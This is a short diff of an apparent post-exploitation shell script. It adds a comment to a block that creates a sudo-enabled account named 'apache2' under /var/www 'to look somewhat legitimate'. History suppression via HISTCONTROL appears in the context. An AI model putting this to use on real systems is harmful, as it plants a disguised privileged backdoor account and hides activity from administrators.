@@ -7,6 +7,7 @@ HISTCONTROL=ignoreboth
 
 # First, we're going to create a new user account named apache2 with home directory
 # /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
+# Edit this user account name and the home directory to whatever you want
 sudo mkdir /var/www/apache2
 sudo useradd -d /var/www/apache2 -s /bin/bash apache2
 sudo usermod -aG sudo apache2
